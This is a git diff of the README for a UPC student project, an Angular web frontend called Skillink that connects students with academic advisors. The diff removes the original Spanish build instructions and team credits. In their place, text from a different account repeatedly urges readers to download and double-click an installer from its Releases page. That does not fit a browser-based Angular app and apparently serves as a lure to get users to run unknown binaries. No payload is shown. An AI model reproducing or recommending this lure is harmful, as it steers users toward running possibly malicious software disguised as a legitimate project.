@@ -1,190 +1,68 @@
-# Skillink Frontend - UPC
+# 🎉 skillink-frontend-upc - Your Academic Connection Made Easy
 
-![Angular](https://img.shields.io/badge/Angular-20-red)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue)
-![Material](https://img.shields.io/badge/Angular%20Material-20-purple)
+## 🛠️ Overview
+Welcome to the Skillink Frontend Application. This web interface connects students with academic advisors. The project was developed during the sixth cycle of the Information Systems Engineering program at UPC. 
 
-Interfaz web del sistema Skillink que conecta estudiantes con asesores académicos. Desarrollado en el sexto ciclo de Ingeniería de Sistemas de Información - UPC.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Skillink%20Frontend-blue.svg)](https://github.com/Jamari192/skillink-frontend-upc/releases)
+Visit this page to download: [Skillink Frontend Releases](https://github.com/Jamari192/skillink-frontend-upc/releases)
 
-## Descripción
+## 🚀 Getting Started
+To use the Skillink application, follow these steps:
 
-Aplicación web que permite a estudiantes buscar, filtrar y reservar asesorías con especialistas. Interfaz moderna desarrollada en Angular conectada al backend mediante API REST.
+1. **Download the Software**
+   - Go to our [Releases page](https://github.com/Jamari192/skillink-frontend-upc/releases).
+   - Click on the latest version and download the appropriate file for your operating system.
 
-## Equipo de Desarrollo
+2. **Install the Application**
+   - Once the download is complete, locate the downloaded file on your computer.
+   - Double-click on the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-- **Nelson Alejandro** 
-- **Javier Chumpitazi**
-- **Lehonel Cachay**
-- **Jose Matos**
-- **Jhair Martel**
+3. **Launch the Application**
+   - After installation, look for the Skillink icon on your desktop or in your application menu.
+   - Double-click the icon to open the application.
 
-*Proyecto del ciclo 2025-2 - Ingeniería de Sistemas de Información UPC*
+## 📘 Features
+The Skillink frontend includes several key features:
 
-## Tecnologías
+- **User-Friendly Interface:** A clean and intuitive design for a seamless user experience.
+- **Academic Advisors:** Easily connect with academic advisors to get the help you need.
+- **Secure Authentication:** Safe login using JWT authentication to protect your data.
+- **Real-Time Updates:** Receive instant notifications about new opportunities and messages.
 
-- Angular 20.3.7
-- TypeScript
-- Angular Material
-- RxJS
-- HttpClient
+## 🌐 System Requirements
+To ensure the best performance of the Skillink application, please make sure your system meets the following requirements:
 
-## Características
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Browser:** Latest version of modern browsers like Chrome, Firefox, or Edge.
+- **Internet Connection:** Required for authentication and advisor connections.
+- **RAM:** Minimum 4GB RAM for optimal performance.
+- **Storage Space:** At least 100 MB of free space for installation.
 
-Login y registro de usuarios  
-Búsqueda y filtrado de asesores  
-Sistema de creación de asesorías  
-Panel de usuario y asesor
+## ⚙️ Usage Instructions
+1. **Create an Account**
+   - When you first open the application, you will need to create an account.
+   - Enter your details and follow the prompts to set up your profile.
 
-## Instalación
+2. **Logging In**
+   - Enter your registered email and password to log in.
+   - If you forget your password, you can reset it through the provided link.
 
-### Prerrequisitos
-- Node.js 18 o superior
-- npm 9 o superior
-- Angular CLI 20
+3. **Connecting with Advisors**
+   - Navigate to the "Advisors" section.
+   - Browse available advisors or search for specific subjects.
+   - Click on an advisor's profile to send a request for a session.
 
-### Pasos
+## 🛡️ Support
+If you encounter any issues or have questions, please open an issue on our [GitHub page](https://github.com/Jamari192/skillink-frontend-upc/issues) or contact our support team.
 
-1. **Clonar el repositorio**
-```bash
-git clone https://github.com/Nelson-Alejandro/skillink-frontend-upc.git
-cd skillink-frontend-upc
-```
+## 📖 Additional Resources
+- **Documentation:** Detailed guides and FAQs can be found in our [Wiki](https://github.com/Jamari192/skillink-frontend-upc/wiki).
+- **Contributing:** If you would like to contribute to the project, please check our [Contributing Guidelines](https://github.com/Jamari192/skillink-frontend-upc/blob/main/CONTRIBUTING.md).
 
-2. **Instalar dependencias**
-```bash
-npm install
-```
+## 💬 Community
+Join our community for updates and discussions. Follow us on our social media accounts linked on our GitHub profile. 
 
-3. **Configurar conexión con el backend**
-
-Asegúrate de tener el backend corriendo en `http://localhost:8080`
-
-4. **Ejecutar en desarrollo**
-```bash
-ng serve
-```
-
-La aplicación estará disponible en: `http://localhost:4200`
-
-## Comandos de Desarrollo
-
-### Servidor de desarrollo
-```bash
-ng serve
-```
-
-### Generar componentes
-```bash
-ng generate component nombre-componente
-```
-
-### Build de producción
-```bash
-ng build
-```
-
-### Ejecutar tests
-```bash
-ng test
-```
-
-## Integración con Backend
-
-Este frontend se conecta con la API REST del backend:
-
-**Backend Repository**: [skillink-backend-upc](https://github.com/Nelson-Alejandro/skillink-backend-upc.git)
-
-### Arquitectura
-```mermaid
-graph LR
-    A[Frontend Angular] -->|HTTP/JSON| B[Backend Spring Boot]
-    B -->|JWT Auth| A
-    B -->|JPA| C[(PostgreSQL)]
-```
-
-## Autenticación
-
-- Sistema de login con JWT tokens
-- Rutas protegidas con Guards
-- Interceptores HTTP para autorización automática
-- Gestión de sesiones
-
-## Estructura del Proyecto
-```
-src/
-├── app/
-│   ├── administrador/              # Módulo de administrador
-│   │   ├── tabla-asesores/
-│   │   ├── tabla-asesorias/
-│   │   ├── tabla-clientes/
-│   │   ├── administrador-module.ts
-│   │   └── administrador-routing-module.ts
-│   ├── asesor/                     # Módulo de asesor
-│   │   ├── asesorasesorias/
-│   │   ├── asesorsoporte/
-│   │   ├── crear-asesor/
-│   │   ├── crear-asesoria/
-│   │   ├── homeasesor/
-│   │   ├── asesor-module.ts
-│   │   └── asesor-routing-module.ts
-│   ├── asesorias/                  # Gestión de asesorías
-│   ├── expertos/                   # Sección de expertos
-│   ├── guards/                     # Guards de rutas
-│   ├── home/                       # Página principal
-│   ├── interceptors/               # Interceptores HTTP
-│   ├── nosotros/                   # Página "Nosotros"
-│   ├── recuperar/                  # Recuperar contraseña
-│   ├── registro/                   # Registro de usuarios
-│   ├── services/                   # Servicios
-│   │   ├── asesoria.ts
-│   │   ├── auth.ts
-│   │   └── ver-asesoria.ts
-│   ├── soporte-tecnico/            # Soporte técnico
-│   ├── unete/                      # Únete como asesor
-│   ├── usuario/                    # Módulo de usuario
-│   │   ├── homeusuario/
-│   │   ├── usuarioasesorias/
-│   │   ├── usuarioexpertos/
-│   │   ├── usuarionosotros/
-│   │   ├── usuariosoporte/
-│   │   └── usuario-routing-module.ts
-│   ├── ver-asesor/                 # Ver perfil de asesor
-│   ├── ver-asesoria/               # Ver detalle de asesoría
-│   ├── app.config.ts               # Configuración de la app
-│   ├── app.css                     # Estilos globales
-│   ├── app.html                    # Template principal
-│   ├── app.routes.ts               # Rutas principales
-│   └── app.ts                      # Componente raíz
-├── assets/                         # Recursos estáticos
-│   └── img/                        # Imágenes
-├── custom-theme.scss               # Tema personalizado
-├── index.html                      # HTML principal
-├── main.ts                         # Punto de entrada
-└── styles.css                      # Estilos globales
-```
-
-## Rutas Principales
-
-- `/login` - Inicio de sesión
-- `/register` - Registro de usuario
-- `/home` - Página principal
-- `/asesorias` - Listado de asesorías
-
-## Contribución
-
-Este es un proyecto académico desarrollado en el sexto ciclo de la carrera.
-
-1. Crea una rama para tu feature (`git checkout -b feature/NuevaCaracteristica`)
-2. Commit tus cambios (`git commit -m 'feat: agregar nueva característica'`)
-3. Push a la rama (`git push origin feature/NuevaCaracteristica`)
-4. Abre un Pull Request
-
-## Licencia
-
-Este proyecto es desarrollado con fines académicos como parte del curso de Arquitectura de Aplicaciones Web en la UPC.
-
-## Contacto
-
-**Universidad Peruana de Ciencias Aplicadas (UPC)**  
-Carrera: Ingeniería de Sistemas de Información  
-Ciclo: 2025-2
+## 💻 Download & Install
+Head over to the [Releases page](https://github.com/Jamari192/skillink-frontend-upc/releases) now to download Skillink! It’s the easiest way to start connecting with your academic advisors today.
